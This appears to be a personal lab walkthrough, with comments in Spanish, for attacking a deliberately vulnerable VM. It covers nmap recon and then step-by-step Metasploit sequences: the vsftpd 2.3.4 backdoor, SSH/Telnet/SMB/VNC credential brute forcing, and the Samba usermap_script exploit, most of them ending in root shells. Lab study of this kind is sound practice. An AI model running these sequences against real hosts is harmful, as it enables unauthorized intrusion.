## Summary

Tags: #Windows  #Linux #FTP #SSH #Telnet #SMB #VNC

- IP -> VMware
- Ports -> TCP (21,22,23,25,53,80,111,139,445,5900), UDP (idk)
- OS ->  Windows 
- Services & Applications

## Launchpad

-   **Launchpad**: [https://launchpad.net/ubuntu](https://launchpad.net/ubuntu)

## Recon

```bash
❯ nmap ❮IP/24❯                      # Para escanear toda la red

❯ nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn ❮Target IP❯  -oG allPorts       # Escaneo en la Capa 4 del modelo OSI

❯ nmap -sCV -p22,... ❮Target IP❯ -oN targeted
```

## Metasploit 

### Port 21

```bash 
❯ msfconsole -q                  # q = Quitar el banner de inicio

	❯ search ftp 2.3.4          # Buscamos el exploit
	❯ use 0                     # Usamos el exploit 'exploit/unix/ftp/vsftpd_234_backdoor' -> Backdoor Command Execution
	❯ options 
	❯ set RHOSTS 192.168.1.194  # Colocamos la IP de la maquina victima
	❯ run                  
	❯ shell                     # Conseguimos una Shell

# Somos usuario root
```


### Port 22

```bash 
❯ msfconsole -q                  # q = Quitar el banner de inicio

# Debemos de tener un diccionario con usuarios y otro con passwd

	❯ search ssh                # Buscamos el exploit
	❯ use 48                    # Usamos el exploit 'auxiliary/scanner/ssh/ssh_login'
	❯ options 
	❯ set RHOSTS 192.168.1.194  # Colocamos la IP de la maquina victima
	❯ set PASS_FILE /home/omar/Documents/claves.txt 
	❯ set USER_FILE /home/omar/Documents/usuarios.txt 
	❯ set VERBOSE true          # Activamos el verbose, para ver los resultados obtenidos 
	❯ run
	❯ sessions -l               # Listamos las sesiones 
	❯ sessions -i <ID>          # Le decimos que queremos usar la sesion 1 y asi logramos entrar 
	❯ shell                     # Para que sea mas facil le solicitamos una Shell

# Somos usuario msfadmin
```

### Port 23

```bash 
❯ msfconsole -q                  # q = Quitar el banner de inicio

	❯ search telnet             # Buscamos el exploit
	❯ use 34                    # Usamos el exploit 'auxiliary/scanner/telnet/telnet_login'
	❯ options 
	❯ set RHOSTS 192.168.1.194  # Colocamos la IP de la maquina victima
	❯ set PASS_FILE /home/omar/Documents/claves.txt 
	❯ set USER_FILE /home/omar/Documents/usuarios.txt 
	❯ set VERBOSE true          # Activamos el verbose, para ver los resultados obtenidos 
	❯ run
	❯ sessions -l               # Listamos las sesiones 
	❯ sessions -i <ID>          # Le decimos que queremos usar la sesion 1 y asi logramos entrar 
	❯ shell                     # Para que sea mas facil le solicitamos una Shell
# Somos usuario msfadmin
```

### Port 139 and Port 445 

```bash 
❯ msfconsole -q                  # q = Quitar el banner de inicio

	❯ search smb                # Buscamos el exploit
	❯ use 105                   # Usamos el exploit 'auxiliary/scanner/smb/smb_version'
	❯ options
	❯ set RHOSTS 192.168.1.194  # Colocamos la IP de la maquina victima
	❯ run 

# Despues de obtener la version del SMB que es: 
❯ search samba 
❯ use 8                          # Usamos el exploit 'exploit/multi/samba/usermap_script'
❯ options
❯ set RHOSTS 192.168.1.194       # Colocamos la IP de la maquina victima
❯ set LHOSTS 192.168.1.157       # Colocamos la IP de nuestra maquina 
❯ run 
❯ shell 

# Somos usuario root


❯ msfconsole -q                  # q = Quitar el banner de inicio

	❯ search smb_login          # Buscamos el exploit
	❯ use 0                     # Usamos el exploit 'auxiliary/scanner/smb/smb_login'
	❯ options
	❯ set RHOSTS 192.168.1.194  # Colocamos la IP de la maquina victima
	❯ set USER_FILE /usr/share/metasploit-framework/data/wordlists/unix-users.txt 
	❯ set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix-passwords.txt
	❯ set VERBOSE false
	❯ run 
# Enumerar usuarios
```


### Port 5900

```bash 
❯ msfconsole -q                  # q = Quitar el banner de inicio

	❯ search vnc 3.3            # Buscamos el exploit
	❯ use 1                     # Usamos el exploit 'auxiliary/scanner/vnc/vnc_login'
	❯ options 
	❯ set RHOSTS 192.168.1.194  # Colocamos la IP de la maquina victima
	❯ set STOP_ON_SUCCESS true  # Activamos la opcion que se pare cuando haya encontrado un inicio
	❯ run 

# Nos pone successful : password
❯ vncviewer 192.168.1.198        # Iniciamos la sesion y le colocamos la passwd encontrada

# Somos usuario root
```

